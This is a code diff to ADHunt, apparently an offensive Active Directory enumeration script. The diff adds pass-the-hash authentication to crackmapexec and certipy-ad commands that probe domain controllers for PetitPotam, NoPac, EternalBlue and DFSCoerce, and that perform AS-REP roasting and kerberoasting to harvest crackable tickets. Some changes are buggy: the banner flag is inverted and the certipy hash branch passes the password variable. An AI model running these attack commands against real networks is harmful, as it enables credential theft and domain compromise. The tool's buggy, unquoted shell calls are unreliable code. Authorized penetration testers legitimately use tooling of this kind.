@@ -31,10 +31,12 @@ parser.add_argument("-i", "--install", action='store_true', help="install nessec
 parser.add_argument("--dc-ip", dest="domain_controller_ip", help="The IP of the domain controller targeted for enumeration")
 parser.add_argument("-u", "--username", help="The username of the user for enumation purposes")
 parser.add_argument("-p", "--password", help="The password of the supplied user")
+parser.add_argument("-H", "--hash", help="hash for pass the hash authentication format [LM:]NTLM")
 parser.add_argument("-d", "--domain", help="The domain of the given user, fetched automatically from LDAP service name")
 parser.add_argument("-s", "--scope", help=f"The scope of valid ips for checking ranges when performing vulnerability scanning and enumeration. Include ranges with {bcolors.HELPHIGHLIGHT}i{bcolors.ENDC}, and exclude with {bcolors.HELPHIGHLIGHT}e{bcolors.ENDC}. Seperate args by commas, For example a valid scope would be {bcolors.HELPEXAMPLE}--scope i:10.129.0.0/24,e:10.129.0.129{bcolors.ENDC}")
 parser.add_argument("--detection-mode", help=f"options: ({bcolors.HELPHIGHLIGHT}aggressive{bcolors.ENDC}, {bcolors.HELPHIGHLIGHT}moderate{bcolors.ENDC}, {bcolors.HELPHIGHLIGHT}passive{bcolors.ENDC}), default is passive (only scan ips found from ad dns information), moderate (scan ips from ad dns and perform regular dns enumeration), aggressive (scan everything in scope)")
-# parser.add_argument("--ssl", help="should we try to connect with ssl")
+parser.add_argument("--no-banner", dest="no_banner", help="Do not display the banner", action='store_true')
+parser.add_argument("--ssl", help="should we try to connect with ssl", action='store_true')
 
 args = parser.parse_args()
 
@@ -49,11 +51,16 @@ if(sys.version_info[0] != 3):
 	sys.exit(1)
 
 ### Header
-print(rf'''{bcolors.OKCYAN} ______  _____       __  __  __  __  __   __  ______  
-/\  __ \/\  __-.    /\ \_\ \/\ \/\ \/\ "-.\ \/\__  _\ 
-\ \  __ \ \ \/\ \   \ \  __ \ \ \_\ \ \ \-.  \/_/\ \/ 
- \ \_\ \_\ \____-    \ \_\ \_\ \_____\ \_\\"\_\ \ \_\ 
-  \/_/\/_/\/____/     \/_/\/_/\/_____/\/_/ \/_/  \/_/ {bcolors.ENDC}''')
+if(not args.no_banner):
+	print("ADHunt by Charlie Fligg")
+	print("")
+else:
+	print(rf'''{bcolors.OKCYAN} ______  _____       __  __  __  __  __   __  ______  
+	/\  __ \/\  __-.    /\ \_\ \/\ \/\ \/\ "-.\ \/\__  _\ 
+	\ \  __ \ \ \/\ \   \ \  __ \ \ \_\ \ \ \-.  \/_/\ \/ 
+	\ \_\ \_\ \____-    \ \_\ \_\ \_____\ \_\\"\_\ \ \_\ 
+	\/_/\/_/\/____/     \/_/\/_/\/_____/\/_/ \/_/  \/_/ {bcolors.ENDC}''')
+
                                                       
 print("") 
 print("")              
@@ -78,14 +85,16 @@ if(args.install):
 # TODO CME along with others will break if there are no routes to services, ie dc01.inlane.htb is not in /etc/hosts
 
 if(not args.domain_controller_ip):
-	print("Must specify the ip of a domain controller with -dc-ip") #eventually not required for aggressive scanning
+	print("Must specify the ip of a domain controller with -dc-ip") # TODO eventually not required for aggressive scanning
 	sys.exit(1)
 
+# TODO figure out if this is nessecary
+"""
 if(args.username != None and args.password == None):
 	print("If a username is supplied a password must also be supplied, Unauthenticated Bind in progress") #TODO unauthenticated bind vs anonymous bind
 	sys.exit(1)
 
-# TODO figure out if this is nessecary
+
 if(args.username == None):
 	print("Attempting Anoynomous Bind to ldap://" + args.domain_controller_ip)
 	print("Checks are not performed")
@@ -98,6 +107,7 @@ if(args.username == None):
 	print(s.info)
 	
 	sys.exit(0)
+"""
 
 if(not args.domain):
 	s = Server(args.domain_controller_ip, get_info = ALL)
@@ -147,8 +157,15 @@ def checkScope(ipt: str):
 		
 	return False
 
-s = Server(args.domain_controller_ip, get_info = ALL)
-c = Connection(s, f"{args.domain}\\{args.username}", args.password, authentication="NTLM")
+if(args.ssl):
+	s = Server(args.domain_controller_ip, get_info=ALL, use_ssl=True)
+else:
+	s = Server(args.domain_controller_ip, get_info=ALL)
+
+if(args.hash):
+	c = Connection(s, f"{args.domain}\\{args.username}", args.hash, authentication="NTLM")
+else:
+	c = Connection(s, f"{args.domain}\\{args.username}", args.password, authentication="NTLM")
 
 if(not c.bind()):
 	print(c.result)
@@ -175,7 +192,10 @@ print(f"Default Context: {default_search_base}")
 print(f"Username: {args.username}")
 print(f"Password: {args.password}")
 print(f"Output Folder: {save_dir}")
-print(f"Scope: Ask")
+if(scopeEnabled):
+	print(f"Scope: {args.scope}")
+else:
+	print(f"Scope: Ask")
 print("")
 
 ### Password Policies
@@ -520,37 +540,49 @@ for ip in system_ips:
 	os.system(f"nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 {ip}")
 	print("")
 
-	#Auth reliant
+
 	print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} WebDav Scan for {ip}")
-	os.system(f"crackmapexec smb {ip} -u '{args.username}' -p '{args.password}'  -M webdav")
+	if(args.hash):
+		os.system(f"crackmapexec smb {ip} -u '{args.username}' -H '{args.hash}'  -M webdav")
+	else:
+		os.system(f"crackmapexec smb {ip} -u '{args.username}' -p '{args.password}'  -M webdav")
 	print("")
 
+
 	print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} Spooler Scan for {ip}")
-	os.system(f"crackmapexec smb {ip} -u '{args.username}' -p '{args.password}'  -M spooler")
+	if(args.hash):
+		os.system(f"crackmapexec smb {ip} -u '{args.username}' -H '{args.hash}'  -M spooler")
+	else:
+		os.system(f"crackmapexec smb {ip} -u '{args.username}' -p '{args.password}'  -M spooler")
 	print("")
 
 	if(ip in dc_ip):
 			print(f"{bcolors.INSTALL}[!]{bcolors.ENDC} {ip} is a domain controller, running extra checks")
 			print("")
-			# TODO AUTH dependant
-			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} LDAP Signing Scan for {domain_controller_name}, with creds {args.username}:{args.password}")
-			os.system(f"crackmapexec ldap {ip} -u '{args.username}' -p '{args.password}' -M ldap-checker")
+
+			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} LDAP Signing Scan for {ip}, with {args.username}")
+			if(args.hash):
+				os.system(f"crackmapexec ldap {ip} -u '{args.username}' -H '{args.hash}' -M ldap-checker")
+			else:
+				os.system(f"crackmapexec ldap {ip} -u '{args.username}' -p '{args.password}' -M ldap-checker")
 			print("")
 
-			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} Petitpotam Scan for {domain_controller_name}")
+			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} Petitpotam Scan for {ip}")
 			os.system(f"crackmapexec smb {ip} -u '' -p '' -M petitpotam")
 			print("")
-			
-			# TODO Auth dependant
-			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} Credentialed Petitpotam Scan for {domain_controller_name}")
-			os.system(f"crackmapexec smb {ip} -u '{args.username}' -p '{args.password}' -M petitpotam")
+
+			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} Credentialed Petitpotam Scan for {ip}")
+			if(args.hash):
+				os.system(f"crackmapexec smb {ip} -u '{args.username}' -H '{args.hash}' -M petitpotam")
+			else:
+				os.system(f"crackmapexec smb {ip} -u '{args.username}' -p '{args.password}' -M petitpotam")
 			print("")
 
-			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} EternalBlue Scan for {domain_controller_name}")
+			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} EternalBlue Scan for {ip}")
 			os.system(f"crackmapexec smb {ip} -u '' -p '' -M ms17-010")
 			print("")
 			
-			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} DFSCoerce Scan for {domain_controller_name}")
+			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} DFSCoerce Scan for {ip}")
 			os.system(f"crackmapexec smb {ip} -u '' -p '' -M dfscoerce")
 			print("")
 			
@@ -559,10 +591,12 @@ for ip in system_ips:
 			os.system(f"crackmapexec smb {vals[selected_ip]} -u '' -p '' -M zerologon")
 			os.system(f"pkill crackmapexec")
 			print("") """
-			
-			#TODO this is dependant on authentication type
-			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} NoPac Scan for {domain_controller_name}, with creds {args.username}:{args.password}")
-			os.system(f"crackmapexec smb {ip} -u '{args.username}' -p '{args.password}' -M nopac")
+
+			print(f"{bcolors.INSTALL}[*]{bcolors.ENDC} Runinng {bcolors.PURPLE}CME{bcolors.ENDC} NoPac Scan for {ip}, with {args.username}")
+			if(args.hash):
+				os.system(f"crackmapexec ldap {ip} -u '{args.username}' -H '{args.hash}' -M nopac")
+			else:
+				os.system(f"crackmapexec ldap {ip} -u '{args.username}' -p '{args.password}' -M nopac")
 			print("")
 
 
@@ -572,9 +606,12 @@ print("=========================")
 print("")
 
 print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Scanning with certipy-ad")
-#TODO Different auth types
+
 #TODO often certipy finds the wrong ip for connecting too
-os.system(f"certipy-ad find -u '{args.username}@{args.domain}' -p '{args.password}' -target-ip '{args.domain_controller_ip}' -dc-ip '{args.domain_controller_ip}' -vulnerable -output {save_dir}/")
+if(args.hash):
+	os.system(f"certipy-ad find -u '{args.username}@{args.domain}' -hashes '{args.password}' -target-ip '{args.domain_controller_ip}' -dc-ip '{args.domain_controller_ip}' -vulnerable -output {save_dir}/")
+else:	
+	os.system(f"certipy-ad find -u '{args.username}@{args.domain}' -p '{args.password}' -target-ip '{args.domain_controller_ip}' -dc-ip '{args.domain_controller_ip}' -vulnerable -output {save_dir}/")
 
 
 ### User Enumerations
@@ -620,10 +657,11 @@ print("")
 ##### Users where ASP-REP roasting is possible
 ####### Retrieve tickets -> output to file
 # TODO Make sure that there is a route to the nameserver (ie, cme needed dc01.inlanefreight.htb in /etc/hosts to work)
-# TODO change for dependance on auth method
-# TODO this breaks randomly when it cannot automatically determine ip of dc (usually grabs the wrong one, same issue with certipy)
 print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Performing {bcolors.PURPLE}CME{bcolors.ENDC} ASREProasting (output hidden)")  
-os.system(f"crackmapexec ldap {args.domain_controller_ip} -u {args.username} -p {args.password} --asreproast {save_dir}/users_asreproast.txt > /dev/null")
+if(args.hash):
+	os.system(f"crackmapexec ldap {args.domain_controller_ip} -u {args.username} -H {args.hash} --asreproast {save_dir}/users_asreproast.txt > /dev/null")
+else:	
+	os.system(f"crackmapexec ldap {args.domain_controller_ip} -u {args.username} -p {args.password} --asreproast {save_dir}/users_asreproast.txt > /dev/null")
 print("")
 
 ######## Option to crack hashes in background
@@ -632,9 +670,11 @@ print("")
 ####### Retrieve tickets -> output to file
 
 # TODO same issue as above
-# TODO change for dependance on auth method
 print(f"{bcolors.INSTALL}[+]{bcolors.ENDC} Performing {bcolors.PURPLE}CME{bcolors.ENDC} kerberoasting (output hidden)")  
-os.system(f"crackmapexec ldap {args.domain_controller_ip} -u {args.username} -p {args.password} --kerberoasting {save_dir}/users_kerberoasting.txt > /dev/null")
+if(args.hash):
+	os.system(f"crackmapexec ldap {args.domain_controller_ip} -u {args.username} -H {args.hash} --kerberoasting {save_dir}/users_kerberoasting.txt > /dev/null")
+else:
+	os.system(f"crackmapexec ldap {args.domain_controller_ip} -u {args.username} -p {args.password} --kerberoasting {save_dir}/users_kerberoasting.txt > /dev/null")
 print("")
 ######## Option to crack hashes in background?
 
